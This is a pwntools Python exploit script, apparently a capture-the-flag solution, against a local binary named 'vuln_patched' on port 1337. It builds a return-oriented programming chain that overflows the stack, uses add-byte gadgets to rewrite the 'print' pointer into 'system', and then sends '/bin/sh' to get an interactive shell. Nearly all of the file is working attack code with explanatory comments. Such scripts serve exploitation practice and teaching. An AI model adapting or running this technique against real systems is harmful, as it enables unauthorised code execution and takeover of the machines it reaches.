#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("localhost", 1337)

    return r


def main():
    r = conn()

    pop_rcx = 0x40117e              # pop rcx; ret;
    add_ptr_rcx_al = 0x40115b       # add byte ptr [rcx], al; pop rbp; ret;

    payload = flat(
                b"A" * 0x20,
                exe.bss(0x40),      # Writeable memory
                exe.sym.gets,       # This sets $al = 4 for future writes (add)
                pop_rcx,
                exe.sym.print + 1,  # We will overwrite `print` pointer to system with add/sub gadgets
                (add_ptr_rcx_al, exe.bss(0x40)) * 3,    # Note: pop writable memory into $rbp to satisfy it
                pop_rcx,
                exe.sym.print,
                (add_ptr_rcx_al, exe.bss(0x40)) * 28,
                exe.sym.gets,       # This will read from 0x0 and will return -1, meaning $al = -1 (sub)
                pop_rcx,
                exe.sym.print + 2,
                (add_ptr_rcx_al, exe.bss(0x40)) * 3,
                pop_rcx + 1,        # ret;  (dummy return to align stack)
                exe.sym.main        # return to main for correct frame initialization to then call system correctly
            )


    r.sendline(payload)
    sleep(1)
    r.sendline(b"AAA")  # 3*'A' + '\n' --> 4B
    sleep(1)
    r.sendline(b"/bin/sh")    # This one is for the failing read but also for the `system()` function
    r.interactive("$ ")


if __name__ == "__main__":
    main()
